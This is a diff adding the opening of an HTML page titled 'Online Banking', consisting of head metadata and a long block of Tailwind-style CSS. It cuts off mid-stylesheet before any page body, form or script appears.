@@ -1,0 +1,1947 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" type="image/svg+xml" href="index_files/logo.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#ded1be">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="description" content="Online Banking">
+    <link rel="apple-touch-icon" href="/logo192.png">
+    <link rel="manifest" href="/manifest.json">
+    <title>Online Banking</title>
+    <style>
+      @import url(https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap);
+    </style>
+    <style>
+      *,
+      ::before,
+      ::after {
+        box-sizing: border-box;
+        /* 1 */
+        border-width: 0;
+        /* 2 */
+        border-style: solid;
+        /* 2 */
+        border-color: #e5e7eb;
+        /* 2 */
+      }
+
+      ::before,
+      ::after {
+        --tw-content: '';
+      }
+
+      /*
+1. Use a consistent sensible line-height in all browsers.
+2. Prevent adjustments of font size after orientation changes in iOS.
+3. Use a more readable tab size.
+4. Use the user's configured `sans` font-family by default.
+5. Use the user's configured `sans` font-feature-settings by default.
+6. Use the user's configured `sans` font-variation-settings by default.
+*/
+      html {
+        line-height: 1.5;
+        /* 1 */
+        -webkit-text-size-adjust: 100%;
+        /* 2 */
+        /* 3 */
+        tab-size: 4;
+        /* 3 */
+        font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+        /* 4 */
+        font-feature-settings: normal;
+        /* 5 */
+        font-variation-settings: normal;
+        /* 6 */
+      }
+
+      body {
+        margin: 0;
+        /* 1 */
+        line-height: inherit;
+        /* 2 */
+      }
+
+      hr {
+        height: 0;
+        /* 1 */
+        color: inherit;
+        /* 2 */
+        border-top-width: 1px;
+        /* 3 */
+      }
+
+      abbr:where([title]) {
+        -webkit-text-decoration: underline dotted;
+        text-decoration: underline dotted;
+      }
+
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6 {
+        font-size: inherit;
+        font-weight: inherit;
+      }
+
+      /*
+Reset links to optimize for opt-in styling instead of opt-out.
+*/
+      a {
+        color: inherit;
+        text-decoration: inherit;
+      }
+
+      /*
+Add the correct font weight in Edge and Safari.
+*/
+      b,
+      strong {
+        font-weight: bolder;
+      }
+
+      /*
+1. Use the user's configured `mono` font family by default.
+2. Correct the odd `em` font sizing in all browsers.
+*/
+      code,
+      kbd,
+      samp,
+      pre {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        /* 1 */
+        font-size: 1em;
+        /* 2 */
+      }
+
+      /*
+Add the correct font size in all browsers.
+*/
+      small {
+        font-size: 80%;
+      }
+
+      /*
+Prevent `sub` and `sup` elements from affecting the line height in all browsers.
+*/
+      sub,
+      sup {
+        font-size: 75%;
+        line-height: 0;
+        position: relative;
+        vertical-align: baseline;
+      }
+
+      sub {
+        bottom: -0.25em;
+      }
+
+      sup {
+        top: -0.5em;
+      }
+
+      /*
+1. Remove text indentation from table contents in Chrome and Safari. (https://bugs.chromium.org/p/chromium/issues/detail?id=999088, https://bugs.webkit.org/show_bug.cgi?id=201297)
+2. Correct table border color inheritance in all Chrome and Safari. (https://bugs.chromium.org/p/chromium/issues/detail?id=935729, https://bugs.webkit.org/show_bug.cgi?id=195016)
+3. Remove gaps between table borders by default.
+*/
+      table {
+        text-indent: 0;
+        /* 1 */
+        border-color: inherit;
+        /* 2 */
+        border-collapse: collapse;
+        /* 3 */
+      }
+
+      /*
+1. Change the font styles in all browsers.
+2. Remove the margin in Firefox and Safari.
+3. Remove default padding in all browsers.
+*/
+      button,
+      input,
+      optgroup,
+      select,
+      textarea {
+        font-family: inherit;
+        /* 1 */
+        font-feature-settings: inherit;
+        /* 1 */
+        font-variation-settings: inherit;
+        /* 1 */
+        font-size: 100%;
+        /* 1 */
+        font-weight: inherit;
+        /* 1 */
+        line-height: inherit;
+        /* 1 */
+        color: inherit;
+        /* 1 */
+        margin: 0;
+        /* 2 */
+        padding: 0;
+        /* 3 */
+      }
+
+      /*
+Remove the inheritance of text transform in Edge and Firefox.
+*/
+      button,
+      select {
+        text-transform: none;
+      }
+
+      /*
+1. Correct the inability to style clickable types in iOS and Safari.
+2. Remove default button styles.
+*/
+      button,
+      [type='button'],
+      [type='reset'],
+      [type='submit'] {
+        -webkit-appearance: button;
+        /* 1 */
+        background-color: transparent;
+        /* 2 */
+        background-image: none;
+        /* 2 */
+      }
+
+      /*
+Use the modern Firefox focus style for all focusable elements.
+*/
+      :-moz-focusring {
+        outline: auto;
+      }
+
+      /*
+Remove the additional `:invalid` styles in Firefox. (https://github.com/mozilla/gecko-dev/blob/2f9eacd9d3d995c937b4251a5557d95d494c9be1/layout/style/res/forms.css#L728-L737)
+*/
+      :-moz-ui-invalid {
+        box-shadow: none;
+      }
+
+      /*
+Add the correct vertical alignment in Chrome and Firefox.
+*/
+      progress {
+        vertical-align: baseline;
+      }
+
+      /*
+Correct the cursor style of increment and decrement buttons in Safari.
+*/
+      ::-webkit-inner-spin-button,
+      ::-webkit-outer-spin-button {
+        height: auto;
+      }
+
+      /*
+1. Correct the odd appearance in Chrome and Safari.
+2. Correct the outline style in Safari.
+*/
+      [type='search'] {
+        -webkit-appearance: textfield;
+        /* 1 */
+        outline-offset: -2px;
+        /* 2 */
+      }
+
+      /*
+Remove the inner padding in Chrome and Safari on macOS.
+*/
+      ::-webkit-search-decoration {
+        -webkit-appearance: none;
+      }
+
+      /*
+1. Correct the inability to style clickable types in iOS and Safari.
+2. Change font properties to `inherit` in Safari.
+*/
+      ::-webkit-file-upload-button {
+        -webkit-appearance: button;
+        /* 1 */
+        font: inherit;
+        /* 2 */
+      }
+
+      /*
+Add the correct display in Chrome and Safari.
+*/
+      summary {
+        display: list-item;
+      }
+
+      /*
+Removes the default spacing and border for appropriate elements.
+*/
+      blockquote,
+      dl,
+      dd,
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6,
+      hr,
+      figure,
+      p,
+      pre {
+        margin: 0;
+      }
+
+      fieldset {
+        margin: 0;
+        padding: 0;
+      }
+
+      legend {
+        padding: 0;
+      }
+
+      ol,
+      ul,
+      menu {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+      }
+
+      /*
+Reset default styling for dialogs.
+*/
+      dialog {
+        padding: 0;
+      }
+
+      /*
+Prevent resizing textareas horizontally by default.
+*/
+      textarea {
+        resize: vertical;
+      }
+
+      /*
+1. Reset the default placeholder opacity in Firefox. (https://github.com/tailwindlabs/tailwindcss/issues/3300)
+2. Set the default placeholder color to the user's configured gray 400 color.
+*/
+      input::placeholder,
+      textarea::placeholder {
+        opacity: 1;
+        /* 1 */
+        color: #9ca3af;
+        /* 2 */
+      }
+
+      /*
+Set the default cursor for buttons.
+*/
+      button,
+      [role="button"] {
+        cursor: pointer;
+      }
+
+      /*
+Make sure disabled buttons don't get the pointer cursor.
+*/
+      :disabled {
+        cursor: default;
+      }
+
+      /*
+1. Make replaced elements `display: block` by default. (https://github.com/mozdevs/cssremedy/issues/14)
+2. Add `vertical-align: middle` to align replaced elements more sensibly by default. (https://github.com/jensimmons/cssremedy/issues/14#issuecomment-634934210)
+   This can trigger a poorly considered lint error in some tools but is included by design.
+*/
+      img,
+      svg,
+      video,
+      canvas,
+      audio,
+      iframe,
+      embed,
+      object {
+        display: block;
+        /* 1 */
+        vertical-align: middle;
+        /* 2 */
+      }
+
+      /*
+Constrain images and videos to the parent width and preserve their intrinsic aspect ratio. (https://github.com/mozdevs/cssremedy/issues/14)
+*/
+      img,
+      video {
+        max-width: 100%;
+        height: auto;
+      }
+
+      /* Make elements with the HTML hidden attribute stay hidden by default */
+      [hidden] {
+        display: none;
+      }
+
+      *,
+      ::before,
+      ::after {
+        --tw-border-spacing-x: 0;
+        --tw-border-spacing-y: 0;
+        --tw-translate-x: 0;
+        --tw-translate-y: 0;
+        --tw-rotate: 0;
+        --tw-skew-x: 0;
+        --tw-skew-y: 0;
+        --tw-scale-x: 1;
+        --tw-scale-y: 1;
+        --tw-pan-x: ;
+        --tw-pan-y: ;
+        --tw-pinch-zoom: ;
+        --tw-scroll-snap-strictness: proximity;
+        --tw-gradient-from-position: ;
+        --tw-gradient-via-position: ;
+        --tw-gradient-to-position: ;
+        --tw-ordinal: ;
+        --tw-slashed-zero: ;
+        --tw-numeric-figure: ;
+        --tw-numeric-spacing: ;
+        --tw-numeric-fraction: ;
+        --tw-ring-inset: ;
+        --tw-ring-offset-width: 0px;
+        --tw-ring-offset-color: #fff;
+        --tw-ring-color: rgb(59 130 246 / 0.5);
+        --tw-ring-offset-shadow: 0 0 #0000;
+        --tw-ring-shadow: 0 0 #0000;
+        --tw-shadow: 0 0 #0000;
+        --tw-shadow-colored: 0 0 #0000;
+        --tw-blur: ;
+        --tw-brightness: ;
+        --tw-contrast: ;
+        --tw-grayscale: ;
+        --tw-hue-rotate: ;
+        --tw-invert: ;
+        --tw-saturate: ;
+        --tw-sepia: ;
+        --tw-drop-shadow: ;
+        --tw-backdrop-blur: ;
+        --tw-backdrop-brightness: ;
+        --tw-backdrop-contrast: ;
+        --tw-backdrop-grayscale: ;
+        --tw-backdrop-hue-rotate: ;
+        --tw-backdrop-invert: ;
+        --tw-backdrop-opacity: ;
+        --tw-backdrop-saturate: ;
+        --tw-backdrop-sepia: ;
+      }
+
+      ::backdrop {
+        --tw-border-spacing-x: 0;
+        --tw-border-spacing-y: 0;
+        --tw-translate-x: 0;
+        --tw-translate-y: 0;
+        --tw-rotate: 0;
+        --tw-skew-x: 0;
+        --tw-skew-y: 0;
+        --tw-scale-x: 1;
+        --tw-scale-y: 1;
+        --tw-pan-x: ;
+        --tw-pan-y: ;
+        --tw-pinch-zoom: ;
+        --tw-scroll-snap-strictness: proximity;
+        --tw-gradient-from-position: ;
+        --tw-gradient-via-position: ;
+        --tw-gradient-to-position: ;
+        --tw-ordinal: ;
+        --tw-slashed-zero: ;
+        --tw-numeric-figure: ;
+        --tw-numeric-spacing: ;
+        --tw-numeric-fraction: ;
+        --tw-ring-inset: ;
+        --tw-ring-offset-width: 0px;
+        --tw-ring-offset-color: #fff;
+        --tw-ring-color: rgb(59 130 246 / 0.5);
+        --tw-ring-offset-shadow: 0 0 #0000;
+        --tw-ring-shadow: 0 0 #0000;
+        --tw-shadow: 0 0 #0000;
+        --tw-shadow-colored: 0 0 #0000;
+        --tw-blur: ;
+        --tw-brightness: ;
+        --tw-contrast: ;
+        --tw-grayscale: ;
+        --tw-hue-rotate: ;
+        --tw-invert: ;
+        --tw-saturate: ;
+        --tw-sepia: ;
+        --tw-drop-shadow: ;
+        --tw-backdrop-blur: ;
+        --tw-backdrop-brightness: ;
+        --tw-backdrop-contrast: ;
+        --tw-backdrop-grayscale: ;
+        --tw-backdrop-hue-rotate: ;
+        --tw-backdrop-invert: ;
+        --tw-backdrop-opacity: ;
+        --tw-backdrop-saturate: ;
+        --tw-backdrop-sepia: ;
+      }
+
+      .sr-only {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border-width: 0;
+      }
+
+      .fixed {
+        position: fixed;
+      }
+
+      .absolute {
+        position: absolute;
+      }
+
+      .relative {
+        position: relative;
+      }
+
+      .left-0 {
+        left: 0px;
+      }
+
+      .right-0 {
+        right: 0px;
+      }
+
+      .right-2 {
+        right: 0.5rem;
+      }
+
+      .right-2\.5 {
+        right: 0.625rem;
+      }
+
+      .top-0 {
+        top: 0px;
+      }
+
+      .top-2 {
+        top: 0.5rem;
+      }
+
+      .top-3 {
+        top: 0.75rem;
+      }
+
+      .z-20 {
+        z-index: 20;
+      }
+
+      .z-50 {
+        z-index: 50;
+      }
+
+      .mx-auto {
+        margin-left: auto;
+        margin-right: auto;
+      }
+
+      .mb-1 {
+        margin-bottom: 0.25rem;
+      }
+
+      .mb-1\.5 {
+        margin-bottom: 0.375rem;
+      }
+
+      .mb-11 {
+        margin-bottom: 2.75rem;
+      }
+
+      .mb-14 {
+        margin-bottom: 3.5rem;
+      }
+
+      .mb-2 {
+        margin-bottom: 0.5rem;
+      }
+
+      .mb-20 {
+        margin-bottom: 5rem;
+      }
+
+      .mb-3 {
+        margin-bottom: 0.75rem;
+      }
+
+      .mb-4 {
+        margin-bottom: 1rem;
+      }
+
+      .mb-5 {
+        margin-bottom: 1.25rem;
+      }
+
+      .mb-6 {
+        margin-bottom: 1.5rem;
+      }
+
+      .ml-2 {
+        margin-left: 0.5rem;
+      }
+
+      .ml-4 {
+        margin-left: 1rem;
+      }
+
+      .ml-8 {
+        margin-left: 2rem;
+      }
+
+      .ml-auto {
+        margin-left: auto;
+      }
+
+      .mr-1 {
+        margin-right: 0.25rem;
+      }
+
+      .mr-2 {
+        margin-right: 0.5rem;
+      }
+
+      .mr-3 {
+        margin-right: 0.75rem;
+      }
+
+      .mr-4 {
+        margin-right: 1rem;
+      }
+
+      .mr-8 {
+        margin-right: 2rem;
+      }
+
+      .mr-auto {
+        margin-right: auto;
+      }
+
+      .mt-0 {
+        margin-top: 0px;
+      }
+
+      .mt-0\.5 {
+        margin-top: 0.125rem;
+      }
+
+      .mt-1 {
+        margin-top: 0.25rem;
+      }
+
+      .mt-1\.5 {
+        margin-top: 0.375rem;
+      }
+
+      .mt-2 {
+        margin-top: 0.5rem;
+      }
+
+      .mt-3 {
+        margin-top: 0.75rem;
+      }
+
+      .mt-4 {
+        margin-top: 1rem;
+      }
+
+      .mt-6 {
+        margin-top: 1.5rem;
+      }
+
+      .mt-7 {
+        margin-top: 1.75rem;
+      }
+
+      .mt-8 {
+        margin-top: 2rem;
+      }
+
+      .mt-\[0\.5px\] {
+        margin-top: 0.5px;
+      }
+
+      .mt-\[2px\] {
+        margin-top: 2px;
+      }
+
+      .block {
+        display: block;
+      }
+
+      .inline {
+        display: inline;
+      }
+
+      .flex {
+        display: flex;
+      }
+
+      .inline-flex {
+        display: inline-flex;
+      }
+
+      .grid {
+        display: grid;
+      }
+
+      .hidden {
+        display: none;
+      }
+
+      .h-3 {
+        height: 0.75rem;
+      }
+
+      .h-40 {
+        height: 10rem;
+      }
+
+      .h-5 {
+        height: 1.25rem;
+      }
+
+      .h-6 {
+        height: 1.5rem;
+      }
+
+      .h-8 {
+        height: 2rem;
+      }
+
+      .h-screen {
+        height: 100vh;
+      }
+
+      .max-h-full {
+        max-height: 100%;
+      }
+
+      .w-3 {
+        width: 0.75rem;
+      }
+
+      .w-40 {
+        width: 10rem;
+      }
+
+      .w-5 {
+        width: 1.25rem;
+      }
+
+      .w-6 {
+        width: 1.5rem;
+      }
+
+      .w-8 {
+        width: 2rem;
+      }
+
+      .w-full {
+        width: 100%;
+      }
+
+      .max-w-2xl {
+        max-width: 42rem;
+      }
+
+      .max-w-md {
+        max-width: 28rem;
+      }
+
+      .max-w-screen-xl {
+        max-width: 1280px;
+      }
+
+      .flex-1 {
+        flex: 1 1;
+      }
+
+      .flex-shrink-0 {
+        flex-shrink: 0;
+      }
+
+      .cursor-pointer {
+        cursor: pointer;
+      }
+
+      .grid-cols-1 {
+        grid-template-columns: repeat(1, minmax(0, 1fr));
+      }
+
+      .grid-cols-2 {
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+      }
+
+      .flex-col {
+        flex-direction: column;
+      }
+
+      .flex-wrap {
+        flex-wrap: wrap;
+      }
+
+      .items-center {
+        align-items: center;
+      }
+
+      .justify-center {
+        justify-content: center;
+      }
+
+      .justify-between {
+        justify-content: space-between;
+      }
+
+      .gap-10 {
+        gap: 2.5rem;
+      }
+
+      .gap-8 {
+        gap: 2rem;
+      }
+
+      .space-x-0> :not([hidden])~ :not([hidden]) {
+        --tw-space-x-reverse: 0;
+        margin-right: calc(0px * var(--tw-space-x-reverse));
+        margin-left: calc(0px * calc(1 - var(--tw-space-x-reverse)));
+      }
+
+      .space-x-5> :not([hidden])~ :not([hidden]) {
+        --tw-space-x-reverse: 0;
+        margin-right: calc(1.25rem * var(--tw-space-x-reverse));
+        margin-left: calc(1.25rem * calc(1 - var(--tw-space-x-reverse)));
+      }
+
+      .space-y-6> :not([hidden])~ :not([hidden]) {
+        --tw-space-y-reverse: 0;
+        margin-top: calc(1.5rem * calc(1 - var(--tw-space-y-reverse)));
+        margin-bottom: calc(1.5rem * var(--tw-space-y-reverse));
+      }
+
+      .space-y-7> :not([hidden])~ :not([hidden]) {
+        --tw-space-y-reverse: 0;
+        margin-top: calc(1.75rem * calc(1 - var(--tw-space-y-reverse)));
+        margin-bottom: calc(1.75rem * var(--tw-space-y-reverse));
+      }
+
+      .space-y-8> :not([hidden])~ :not([hidden]) {
+        --tw-space-y-reverse: 0;
+        margin-top: calc(2rem * calc(1 - var(--tw-space-y-reverse)));
+        margin-bottom: calc(2rem * var(--tw-space-y-reverse));
+      }
+
+      .place-self-center {
+        place-self: center;
+      }
+
+      .rounded-lg {
+        border-radius: 0.5rem;
+      }
+
+      .rounded-md {
+        border-radius: 0.375rem;
+      }
+
+      .rounded-xl {
+        border-radius: 0.75rem;
+      }
+
+      .border {
+        border-width: 1px;
+      }
+
+      .border-b-2 {
+        border-bottom-width: 2px;
+      }
+
+      .border-b-4 {
+        border-bottom-width: 4px;
+      }
+
+      .border-\[\#008555\] {
+        --tw-border-opacity: 1;
+        border-color: rgb(0 133 85 / var(--tw-border-opacity));
+      }
+
+      .border-\[\#044da2\] {
+        --tw-border-opacity: 1;
+        border-color: rgb(4 77 162 / var(--tw-border-opacity));
+      }
+
+      .border-black {
+        --tw-border-opacity: 1;
+        border-color: rgb(0 0 0 / var(--tw-border-opacity));
+      }
+
+      .border-gray-200 {
+        --tw-border-opacity: 1;
+        border-color: rgb(229 231 235 / var(--tw-border-opacity));
+      }
+
+      .border-gray-300 {
+        --tw-border-opacity: 1;
+        border-color: rgb(209 213 219 / var(--tw-border-opacity));
+      }
+
+      .border-gray-400 {
+        --tw-border-opacity: 1;
+        border-color: rgb(156 163 175 / var(--tw-border-opacity));
+      }
+
+      .border-neutral-400 {
+        --tw-border-opacity: 1;
+        border-color: rgb(163 163 163 / var(--tw-border-opacity));
+      }
+
+      .bg-\[\#006a44\] {
+        --tw-bg-opacity: 1;
+        background-color: rgb(0 106 68 / var(--tw-bg-opacity));
+      }
+
+      .bg-\[\#008555\] {
+        --tw-bg-opacity: 1;
+        background-color: rgb(0 133 85 / var(--tw-bg-opacity));
+      }
+
+      .bg-\[\#d93d00\] {
+        --tw-bg-opacity: 1;
+        background-color: rgb(217 61 0 / var(--tw-bg-opacity));
+      }
+
+      .bg-\[\#e6edf5\] {
+        --tw-bg-opacity: 1;
+        background-color: rgb(230 237 245 / var(--tw-bg-opacity));
+      }
+
+      .bg-\[\#f2f1f1\] {
+        --tw-bg-opacity: 1;
+        background-color: rgb(242 241 241 / var(--tw-bg-opacity));
+      }
+
+      .bg-gray-100 {
+        --tw-bg-opacity: 1;
+        background-color: rgb(243 244 246 / var(--tw-bg-opacity));
+      }
+
+      .bg-gray-50 {
+        --tw-bg-opacity: 1;
+        background-color: rgb(249 250 251 / var(--tw-bg-opacity));
+      }
+
+      .bg-transparent {
+        background-color: transparent;
+      }
+
+      .bg-white {
+        --tw-bg-opacity: 1;
+        background-color: rgb(255 255 255 / var(--tw-bg-opacity));
+      }
+
+      .p-2 {
+        padding: 0.5rem;
+      }
+
+      .p-2\.5 {
+        padding: 0.625rem;
+      }
+
+      .p-3 {
+        padding: 0.75rem;
+      }
+
+      .p-3\.5 {
+        padding: 0.875rem;
+      }
+
+      .p-4 {
+        padding: 1rem;
+      }
+
+      .p-5 {
+        padding: 1.25rem;
+      }
+
+      .p-6 {
+        padding: 1.5rem;
+      }
+
+      .px-2 {
+        padding-left: 0.5rem;
+        padding-right: 0.5rem;
+      }
+
+      .px-3 {
+        padding-left: 0.75rem;
+        padding-right: 0.75rem;
+      }
+
+      .px-4 {
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+
+      .px-5 {
+        padding-left: 1.25rem;
+        padding-right: 1.25rem;
+      }
+
+      .px-6 {
+        padding-left: 1.5rem;
+        padding-right: 1.5rem;
+      }
+
+      .py-1 {
+        padding-top: 0.25rem;
+        padding-bottom: 0.25rem;
+      }
+
+      .py-1\.5 {
+        padding-top: 0.375rem;
+        padding-bottom: 0.375rem;
+      }
+
+      .py-2 {
+        padding-top: 0.5rem;
+        padding-bottom: 0.5rem;
+      }
+
+      .py-2\.5 {
+        padding-top: 0.625rem;
+        padding-bottom: 0.625rem;
+      }
+
+      .py-3 {
+        padding-top: 0.75rem;
+        padding-bottom: 0.75rem;
+      }
+
+      .py-3\.5 {
+        padding-top: 0.875rem;
+        padding-bottom: 0.875rem;
+      }
+
+      .py-5 {
+        padding-top: 1.25rem;
+        padding-bottom: 1.25rem;
+      }
+
+      .py-6 {
+        padding-top: 1.5rem;
+        padding-bottom: 1.5rem;
+      }
+
+      .pb-32 {
+        padding-bottom: 8rem;
+      }
+
+      .pl-3 {
+        padding-left: 0.75rem;
+      }
+
+      .pl-3\.5 {
+        padding-left: 0.875rem;
+      }
+
+      .pr-10 {
+        padding-right: 2.5rem;
+      }
+
+      .pt-0 {
+        padding-top: 0px;
+      }
+
+      .text-center {
+        text-align: center;
+      }
+
+      .font-roboto {
+        font-family: Roboto, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+      }
+
+      .text-2xl {
+        font-size: 1.5rem;
+        line-height: 2rem;
+      }
+
+      .text-3xl {
+        font-size: 1.875rem;
+        line-height: 2.25rem;
+      }
+
+      .text-\[14\.5px\] {
+        font-size: 14.5px;
+      }
+
+      .text-base {
+        font-size: 1rem;
+        line-height: 1.5rem;
+      }
+
+      .text-lg {
+        font-size: 1.125rem;
+        line-height: 1.75rem;
+      }
+
+      .text-sm {
+        font-size: 0.875rem;
+        line-height: 1.25rem;
+      }
+
+      .text-xl {
+        font-size: 1.25rem;
+        line-height: 1.75rem;
+      }
+
+      .font-bold {
+        font-weight: 700;
+      }
+
+      .font-extrabold {
+        font-weight: 800;
+      }
+
+      .font-light {
+        font-weight: 300;
+      }
+
+      .font-medium {
+        font-weight: 500;
+      }
+
+      .font-normal {
+        font-weight: 400;
+      }
+
+      .font-semibold {
+        font-weight: 600;
+      }
+
+      .leading-none {
+        line-height: 1;
+      }
+
+      .tracking-tight {
+        letter-spacing: -0.025em;
+      }
+
+      .text-\[\#044da3\] {
+        --tw-text-opacity: 1;
+        color: rgb(4 77 163 / var(--tw-text-opacity));
+      }
+
+      .text-\[\#101213\] {
+        --tw-text-opacity: 1;
+        color: rgb(16 18 19 / var(--tw-text-opacity));
+      }
+
+      .text-\[\#5792fc\] {
+        --tw-text-opacity: 1;
+        color: rgb(87 146 252 / var(--tw-text-opacity));
+      }
+
+      .text-\[\#76777a\] {
+        --tw-text-opacity: 1;
+        color: rgb(118 119 122 / var(--tw-text-opacity));
+      }
+
+      .text-\[\#7c7474\] {
+        --tw-text-opacity: 1;
+        color: rgb(124 116 116 / var(--tw-text-opacity));
+      }
+
+      .text-\[\#7d8d9d\] {
+        --tw-text-opacity: 1;
+        color: rgb(125 141 157 / var(--tw-text-opacity));
+      }
+
+      .text-\[\#818da4\] {
+        --tw-text-opacity: 1;
+        color: rgb(129 141 164 / var(--tw-text-opacity));
+      }
+
+      .text-\[\#828d9b\] {
+        --tw-text-opacity: 1;
+        color: rgb(130 141 155 / var(--tw-text-opacity));
+      }
+
+      .text-\[\#962121\] {
+        --tw-text-opacity: 1;
+        color: rgb(150 33 33 / var(--tw-text-opacity));
+      }
+
+      .text-black {
+        --tw-text-opacity: 1;
+        color: rgb(0 0 0 / var(--tw-text-opacity));
+      }
+
+      .text-gray-300 {
+        --tw-text-opacity: 1;
+        color: rgb(209 213 219 / var(--tw-text-opacity));
+      }
+
+      .text-gray-400 {
+        --tw-text-opacity: 1;
+        color: rgb(156 163 175 / var(--tw-text-opacity));
+      }
+
+      .text-gray-700 {
+        --tw-text-opacity: 1;
+        color: rgb(55 65 81 / var(--tw-text-opacity));
+      }
+
+      .text-gray-800 {
+        --tw-text-opacity: 1;
+        color: rgb(31 41 55 / var(--tw-text-opacity));
+      }
+
+      .text-gray-900 {
+        --tw-text-opacity: 1;
+        color: rgb(17 24 39 / var(--tw-text-opacity));
+      }
+
+      .text-white {
+        --tw-text-opacity: 1;
+        color: rgb(255 255 255 / var(--tw-text-opacity));
+      }
+
+      .underline {
+        text-decoration-line: underline;
+      }
+
+      .shadow-xl {
+        --tw-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
+        --tw-shadow-colored: 0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);
+        box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
+      }
+
+      .hover\:bg-\[\#ad3000\]:hover {
+        --tw-bg-opacity: 1;
+        background-color: rgb(173 48 0 / var(--tw-bg-opacity));
+      }
+
+      .hover\:bg-gray-100:hover {
+        --tw-bg-opacity: 1;
+        background-color: rgb(243 244 246 / var(--tw-bg-opacity));
+      }
+
+      .hover\:bg-gray-200:hover {
+        --tw-bg-opacity: 1;
+        background-color: rgb(229 231 235 / var(--tw-bg-opacity));
+      }
+
+      .hover\:text-\[\#0356b5\]:hover {
+        --tw-text-opacity: 1;
+        color: rgb(3 86 181 / var(--tw-text-opacity));
+      }
+
+      .hover\:text-\[\#1c4681\]:hover {
+        --tw-text-opacity: 1;
+        color: rgb(28 70 129 / var(--tw-text-opacity));
+      }
+
+      .hover\:text-gray-900:hover {
+        --tw-text-opacity: 1;
+        color: rgb(17 24 39 / var(--tw-text-opacity));
+      }
+
+      .hover\:underline:hover {
+        text-decoration-line: underline;
+      }
+
+      .focus\:border-\[3px\]:focus {
+        border-width: 3px;
+      }
+
+      .focus\:border-black:focus {
+        --tw-border-opacity: 1;
+        border-color: rgb(0 0 0 / var(--tw-border-opacity));
+      }
+
+      .focus\:border-blue-500:focus {
+        --tw-border-opacity: 1;
+        border-color: rgb(59 130 246 / var(--tw-border-opacity));
+      }
+
+      .focus\:outline-none:focus {
+        outline: 2px solid transparent;
+        outline-offset: 2px;
+      }
+
+      .focus\:ring-4:focus {
+        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
+        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(4px + var(--tw-ring-offset-width)) var(--tw-ring-color);
+        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
+      }
+
+      .focus\:ring-black:focus {
+        --tw-ring-opacity: 1;
+        --tw-ring-color: rgb(0 0 0 / var(--tw-ring-opacity));
+      }
+
+      .focus\:ring-blue-500:focus {
+        --tw-ring-opacity: 1;
+        --tw-ring-color: rgb(59 130 246 / var(--tw-ring-opacity));
+      }
+
+      @media (prefers-color-scheme: dark) {
+        .dark\:text-black {
+          --tw-text-opacity: 1;
+          color: rgb(0 0 0 / var(--tw-text-opacity));
+        }
+
+        .dark\:hover\:bg-gray-600:hover {
+          --tw-bg-opacity: 1;
+          background-color: rgb(75 85 99 / var(--tw-bg-opacity));
+        }
+
+        .dark\:hover\:text-white:hover {
+          --tw-text-opacity: 1;
+          color: rgb(255 255 255 / var(--tw-text-opacity));
+        }
+      }
+
+      @media (min-width: 640px) {
+        .sm\:ml-2 {
+          margin-left: 0.5rem;
+        }
+
+        .sm\:ml-4 {
+          margin-left: 1rem;
+        }
+
+        .sm\:ml-8 {
+          margin-left: 2rem;
+        }
+
+        .sm\:mr-2 {
+          margin-right: 0.5rem;
+        }
+
+        .sm\:mr-4 {
+          margin-right: 1rem;
+        }
+
+        .sm\:mr-8 {
+          margin-right: 2rem;
+        }
+
+        .sm\:mt-3 {
+          margin-top: 0.75rem;
+        }
+
+        .sm\:mt-6 {
+          margin-top: 1.5rem;
+        }
+
+        .sm\:flex {
+          display: flex;
+        }
+
+        .sm\:grid-cols-2 {
+          grid-template-columns: repeat(2, minmax(0, 1fr));
+        }
+
+        .sm\:items-center {
+          align-items: center;
+        }
+
+        .sm\:justify-start {
+          justify-content: flex-start;
+        }
+
+        .sm\:justify-between {
+          justify-content: space-between;
+        }
+
+        .sm\:gap-6 {
+          gap: 1.5rem;
+        }
+
+        .sm\:space-x-0> :not([hidden])~ :not([hidden]) {
+          --tw-space-x-reverse: 0;
+          margin-right: calc(0px * var(--tw-space-x-reverse));
+          margin-left: calc(0px * calc(1 - var(--tw-space-x-reverse)));
+        }
+
+        .sm\:space-y-10> :not([hidden])~ :not([hidden]) {
+          --tw-space-y-reverse: 0;
+          margin-top: calc(2.5rem * calc(1 - var(--tw-space-y-reverse)));
+          margin-bottom: calc(2.5rem * var(--tw-space-y-reverse));
+        }
+
+        .sm\:text-left {
+          text-align: left;
+        }
+
+        .sm\:text-center {
+          text-align: center;
+        }
+
+        .sm\:text-base {
+          font-size: 1rem;
+          line-height: 1.5rem;
+        }
+      }
+
+      @media (min-width: 768px) {
+        .md\:-right-20 {
+          right: -5rem;
+        }
+
+        .md\:mb-0 {
+          margin-bottom: 0px;
+        }
+
+        .md\:mt-3 {
+          margin-top: 0.75rem;
+        }
+
+        .md\:flex {
